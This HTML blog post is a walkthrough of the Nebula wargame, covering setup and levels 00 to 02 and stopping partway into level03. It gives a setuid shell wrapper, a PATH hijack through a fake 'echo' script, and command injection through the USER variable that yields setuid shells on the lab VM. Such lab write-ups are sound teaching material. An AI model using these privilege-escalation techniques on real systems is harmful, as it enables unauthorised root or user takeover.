
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>playing exploit-exercises - nebula - #!/slash/note</title>
  <meta name="author" content="Leon Jacobs">

  
  <meta name="description" content="introduction Recently I decided I wanted to have a look at what Exploit Exercises had to offer. I was after the memory corruption related &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://leonjza.github.io/blog/2015/05/09/playing-exploit-exercises-nebula">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="#!/slash/note" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-44457032-2']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">#!/slash/note</a></h1>
  
    <h2>A checkbox unchecker's notepad</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:leonjza.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
  <li><a href="/about">About</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">playing exploit-exercises - nebula</h1>
    
    
      <p class="meta">
        








  


<time datetime="2015-05-09T07:18:31+02:00" pubdate data-updated="true">May 9<sup>th</sup>, 2015</time>
        
      </p>
    
  </header>


<div class="entry-content"><h2>introduction</h2>

<p>Recently I decided I wanted to have a look at what <a href="https://exploit-exercises.com/">Exploit Exercises</a> had to offer. I was after the memory corruption related exploitation stuff to play with, until I saw the details for <a href="https://exploit-exercises.com/nebula/">Nebula</a>. <em>Nebula covers a variety of simple and intermediate challenges that cover Linux privilege escalation, common scripting language issues, and file system race conditions.</em></p>

<p><img src="https://i.imgur.com/6K9zeta.jpg"></p>

<p>I did not really have a lot of time on my hands and figured I should start with the &ldquo;easy&rdquo; stuff. Many of the levels Nebula presented were in fact very, very easy. However, towards final levels my knowledge was definitely being tested. Levels started taking much longer to complete as I was yet again realizing that the more you learn, the more you realize you you still have to learn. :)</p>

<p>This is the path I took to solve the 20 challenges.</p>

<!-- more -->


<h2>setup</h2>

<p>On the details page, one could easily learn the format of the challenges, as well as some information should you need to get root access on the VM to configure things. Obviously the point is not to login with this account to solve challenges, but merely to fix things if they are broken for some reason.</p>

<p>After my download finished, I booted the live image, checked the IP address it got assigned using the Nebula account and tried to SSH in:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>~ » ssh level00@192.168.217.239
</span><span class='line'>no hostkey alg
</span></code></pre></td></tr></table></div></figure>


<p><em>sigh</em>. Some quick diagnostics showed that my SSH client was attempting to identify the remote server with a RSA/DSA key, but none was being presented. So, I quickly escalated the <code>nebula</code> account to root and generated a RSA host key with: <code>ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key</code> with no password. I was now able to log in:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>~ » ssh level00@192.168.217.239
</span><span class='line'>The authenticity of host &#39;192.168.217.239 (192.168.217.239)&#39; can&#39;t be established.
</span><span class='line'>RSA key fingerprint is cf:cf:68:5b:01:05:a8:52:aa:19:aa:54:a8:27:5d:46.
</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
</span><span class='line'>Warning: Permanently added &#39;192.168.217.239&#39; (RSA) to the list of known hosts.
</span><span class='line'>
</span><span class='line'>      _   __     __          __
</span><span class='line'>     / | / /__  / /_  __  __/ /___ _
</span><span class='line'>    /  |/ / _ \/ __ \/ / / / / __ `/
</span><span class='line'>   / /|  /  __/ /_/ / /_/ / / /_/ /
</span><span class='line'>  /_/ |_/\___/_.___/\__,_/_/\__,_/
</span><span class='line'>
</span><span class='line'>    exploit-exercises.com/nebula
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>For level descriptions, please see the above URL.
</span><span class='line'>
</span><span class='line'>To log in, use the username of &quot;levelXX&quot; and password &quot;levelXX&quot;, where
</span><span class='line'>XX is the level number.
</span><span class='line'>
</span><span class='line'>Currently there are 20 levels (00 - 19).
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>level00@192.168.217.239&#39;s password:
</span><span class='line'>Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)
</span><span class='line'>
</span><span class='line'> * Documentation:  https://help.ubuntu.com/
</span><span class='line'>New release &#39;12.04 LTS&#39; available.
</span><span class='line'>Run &#39;do-release-upgrade&#39; to upgrade to it.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>The programs included with the Ubuntu system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span><span class='line'>applicable law.
</span><span class='line'>
</span><span class='line'>level00@nebula:~$
</span></code></pre></td></tr></table></div></figure>


<p>I could see that I was now logged in as level00</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level00@nebula:~<span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>level00<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>level00<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>level00<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>The challenges are all in their respective <code>flag</code> folder. So if you are logged in as <code>level00</code>, you are interested in <code>flag00</code>. Once you have exploited whatever needed exploiting and gained the privileges of the respective flag, the command <code>getflag</code> could be run to confirm that you have the correct access. For the most part, I actually wanted to get shells as the users I escalated to, but just running <code>getflag</code> is enough to consider a level done. I had prepared a small C setuid shell in <code>/var/tmp/shell.c</code> with the following output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include&lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">setresuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
</span><span class='line'>    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This shell was reused throughout the challenges. Lets dig into the challenges themselves.</p>

<h2>level00</h2>

<p><a href="https://exploit-exercises.com/nebula/level00/">Level00&rsquo;s Description</a>:</p>

<blockquote><p>This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.</p></blockquote>


<p>Finding SUID binaries is really easy. I guess because this is the format most of the challenges are in, it was a good start to get the challenger to know <em>about</em> SUID binaries :P</p>

<p>So, to solve level00:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level00@nebula:~<span class="nv">$ </span>find / -perm -4000 2&gt; /dev/null <span class="p">|</span> xargs ls -lh
</span><span class='line'>-rwsr-x--- 1 flag00  level00    7.2K 2011-11-20 21:22 /bin/.../flag00
</span><span class='line'>-rwsr-xr-x 1 root    root        26K 2011-05-18 03:12 /bin/fusermount
</span><span class='line'>-rwsr-xr-x 1 root    root        87K 2011-08-09 09:15 /bin/mount
</span><span class='line'>-rwsr-xr-x 1 root    root        34K 2011-05-03 03:38 /bin/ping
</span><span class='line'>-rwsr-xr-x 1 root    root        39K 2011-05-03 03:38 /bin/ping6
</span><span class='line'>-rwsr-xr-x 1 root    root        31K 2011-06-24 02:37 /bin/su
</span><span class='line'>-rwsr-xr-x 1 root    root        63K 2011-08-09 09:15 /bin/umount
</span><span class='line'>-rwsr-x--- 1 flag00  level00    7.2K 2011-11-20 21:22 /rofs/bin/.../flag00
</span><span class='line'>-rwsr-xr-x 1 root    root        26K 2011-05-18 03:12 /rofs/bin/fusermount
</span><span class='line'>-rwsr-xr-x 1 root    root        87K 2011-08-09 09:15 /rofs/bin/mount
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>level00@nebula:~<span class="nv">$ </span>/bin/.../flag00
</span><span class='line'>Congrats, now run getflag to get your flag!
</span><span class='line'>
</span><span class='line'>flag00@nebula:~<span class="nv">$ </span>getflag
</span><span class='line'>You have successfully executed getflag on a target account
</span></code></pre></td></tr></table></div></figure>


<h2>level01</h2>

<p><a href="https://exploit-exercises.com/nebula/level01/">Level01&rsquo;s Description</a>:</p>

<blockquote><p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p></blockquote>


<p>With the description we are provided with the source code of a small C program:</p>

<figure class='code'><figcaption><span>level1.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">gid_t</span> <span class="n">gid</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">uid_t</span> <span class="n">uid</span><span class="p">;</span>
</span><span class='line'>  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">system</span><span class="p">(</span><span class="s">&quot;/usr/bin/env echo and now what?&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>We can see a bunch of UID/GID stuff being set with with <code>setresgid</code> and <code>setresuid</code> and then a system command being run with <code>system()</code>. The problem lies in the fact that the command that is being run does not have a full path specified for the <code>echo</code> command. Even though its called with <code>/usr/bin/env</code>, it is possible to modify the current <code>PATH</code> variable and have <code>env</code> report echo as being somewhere other than where it would normally be.</p>

<p>On the filesystem we find the <code>flag01</code> binary and can see it is setuid for <code>flag01</code> user (we are currently logged in as <code>level01</code>):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level01@nebula:~<span class="nv">$ </span><span class="nb">cd</span> ~flag01/
</span><span class='line'>level01@nebula:/home/flag01<span class="nv">$ </span>ls -lh flag01
</span><span class='line'>-rwsr-x--- 1 flag01 level01 7.2K 2011-11-20 21:22 flag01
</span><span class='line'>
</span><span class='line'>level01@nebula:/home/flag01<span class="nv">$ </span>./flag01
</span><span class='line'>and now what?
</span></code></pre></td></tr></table></div></figure>


<p>Abusing this is really easy. I decided to create my own <code>echo</code> binary and modified <code>PATH</code> so that it is called instead of the real <code>echo</code>. A small note here though. The Nebula vm has <code>/tmp</code> mounted with the <code>nosuid</code> option. I see this many times in the real world. What this effectively means is that any suid bit will be ignored for binaries executed on this mount point. Luckily though my second resort being <code>/var/tmp</code> was not mounted separately and I had write access there :)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level01@nebula:/home/flag01<span class="nv">$ </span>mount <span class="p">|</span> grep <span class="s2">&quot;/tmp&quot;</span>
</span><span class='line'>tmpfs on /tmp <span class="nb">type </span>tmpfs <span class="o">(</span>rw,nosuid,nodev<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>level01@nebula:/home/flag01<span class="nv">$ </span>ls -lah /var/ <span class="p">|</span> grep tmp
</span><span class='line'>drwxrwxrwt 3 root root   29 2012-08-23 18:46 tmp
</span></code></pre></td></tr></table></div></figure>


<p>So, to solve level01:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level01@nebula:/home/flag01<span class="nv">$ </span>cat /var/tmp/echo
</span><span class='line'><span class="c">#!/bin/sh</span>
</span><span class='line'>gcc /var/tmp/shell.c -o /var/tmp/flag01
</span><span class='line'>chmod 4777 /var/tmp/flag01
</span><span class='line'>
</span><span class='line'>level01@nebula:/home/flag01<span class="nv">$ </span>ls -lh /var/tmp/echo
</span><span class='line'>-rwxrwxr-x 1 level01 level01 77 2015-05-08 07:35 /var/tmp/echo
</span><span class='line'>
</span><span class='line'>level01@nebula:/home/flag01<span class="nv">$ </span>cat /var/tmp/shell.c
</span><span class='line'><span class="c">#include&lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'>int main<span class="o">(</span>void<span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    setresuid<span class="o">(</span>geteuid<span class="o">()</span>, geteuid<span class="o">()</span>, geteuid<span class="o">())</span><span class="p">;</span>
</span><span class='line'>    system<span class="o">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="k">return </span>0<span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>level01@nebula:/home/flag01<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/var/tmp:<span class="nv">$PATH</span>
</span><span class='line'>level01@nebula:/home/flag01<span class="nv">$ </span>./flag01
</span><span class='line'>level01@nebula:/home/flag01<span class="nv">$ </span>ls -lah /var/tmp/flag01
</span><span class='line'>-rwsrwxrwx 1 flag01 level01 7.1K 2015-05-08 07:37 /var/tmp/flag01
</span><span class='line'>
</span><span class='line'>level01@nebula:/home/flag01<span class="nv">$ </span>/var/tmp/flag01
</span><span class='line'>sh-4.2<span class="nv">$ </span>getflag
</span><span class='line'>You have successfully executed getflag on a target account
</span></code></pre></td></tr></table></div></figure>


<h2>level02</h2>

<p><a href="https://exploit-exercises.com/nebula/level02/">Level02&rsquo;s Description</a>:</p>

<blockquote><p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p></blockquote>


<p>With the description we are provided with the source code of a small C program:</p>

<figure class='code'><figcaption><span>level2.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="kt">gid_t</span> <span class="n">gid</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">uid_t</span> <span class="n">uid</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&quot;/bin/echo %s is cool&quot;</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;USER&quot;</span><span class="p">));</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;about to call system(</span><span class="se">\&quot;</span><span class="s">%s</span><span class="se">\&quot;</span><span class="s">)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Level02 is very similar to Level01, except for that fact that here the line <code>/bin/echo %s is cool</code> is copied to <code>buffer</code> and eventually put through a <code>system()</code> call. The value of the current environment variable <code>USER</code> is added to the command. This is another easy exploit where a simple shell escape will do to get us our own shell. I prepped the shell to echo the word bob, the delimit the command with a ; character and specify the command I want to run. I then end it off with a hash (#) to ignore the rest of the commands that the program has hard coded (<em>is cool</em> in this case).</p>

<p>So, to solve level02:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level02@nebula:/home/flag02<span class="nv">$ </span>./flag02
</span><span class='line'>about to call system<span class="o">(</span><span class="s2">&quot;/bin/echo level02 is cool&quot;</span><span class="o">)</span>
</span><span class='line'>level02 is cool
</span><span class='line'>
</span><span class='line'>level02@nebula:/home/flag02<span class="nv">$ USER</span><span class="o">=</span><span class="s2">&quot;bob&quot;</span> <span class="o">&amp;&amp;</span> ./flag02
</span><span class='line'>about to call system<span class="o">(</span><span class="s2">&quot;/bin/echo bob is cool&quot;</span><span class="o">)</span>
</span><span class='line'>bob is cool
</span><span class='line'>
</span><span class='line'>level02@nebula:/home/flag02<span class="nv">$ </span>cat /var/tmp/shell.c
</span><span class='line'><span class="c">#include&lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'>int main<span class="o">(</span>void<span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    setresuid<span class="o">(</span>geteuid<span class="o">()</span>, geteuid<span class="o">()</span>, geteuid<span class="o">())</span><span class="p">;</span>
</span><span class='line'>    system<span class="o">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="k">return </span>0<span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>level02@nebula:/home/flag02<span class="nv">$ USER</span><span class="o">=</span><span class="s2">&quot;bob; id;#&quot;</span> <span class="o">&amp;&amp;</span> ./flag02
</span><span class='line'>about to call system<span class="o">(</span><span class="s2">&quot;/bin/echo bob; id;# is cool&quot;</span><span class="o">)</span>
</span><span class='line'>bob
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>997<span class="o">(</span>flag02<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1003<span class="o">(</span>level02<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>997<span class="o">(</span>flag02<span class="o">)</span>,1003<span class="o">(</span>level02<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>level02@nebula:/home/flag02<span class="nv">$ USER</span><span class="o">=</span><span class="s2">&quot;bob; gcc /var/tmp/shell.c -o /var/tmp/flag02; chmod 4777 /var/tmp/flag02;#&quot;</span> <span class="o">&amp;&amp;</span> ./flag02
</span><span class='line'>about to call system<span class="o">(</span><span class="s2">&quot;/bin/echo bob; gcc /var/tmp/shell.c -o /var/tmp/flag02; chmod 4777 /var/tmp/flag02;# is cool&quot;</span><span class="o">)</span>
</span><span class='line'>bob
</span><span class='line'>
</span><span class='line'>level02@nebula:/home/flag02<span class="nv">$ </span>/var/tmp/flag02
</span><span class='line'>sh-4.2<span class="nv">$ </span>getflag
</span><span class='line'>You have successfully executed getflag on a target account
</span></code></pre></td></tr></table></div></figure>


<h2>level03</h2>

<p><a href="https://exploit-exercises.com/nebula/level03/">Level03&rsquo;s Description</a>:</p>

<blockquote><p>Check the home directory of flag03 and take note of the files there.<br/>There is a crontab that is called every couple of minutes.</p></blockquote>


<p>Logging in as <code>level03</code>, we find a directory and a <code>sh</code> script:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level03@nebula:~<span class="nv">$ </span><span class="nb">cd</span> ~flag03
</span><span class='line'>level03@nebula:/home/flag03<span class="nv">$ </span>ls -lh
</span><span class='line'>total 512
</span><span class='line'>drwxrwxrwx 2 flag03 flag03  3 2012-08-18 05:24 writable.d
</span><span class='line'>-rwxr-xr-x 1 flag03 flag03 98 2011-11-20 21:22 writable.sh
</span><span class='line'>
</span><span class='line'>level03@nebula:/home/flag03<span class="nv">$ </span>cat writable.sh
</span><span class='line'><span class="c">#!/bin/sh</span>
</span><span class='line'>
</span><span class='line'><span class="k">for </span>i in /home/flag03/writable.d/* <span class="p">;</span> <span class="k">do</span>
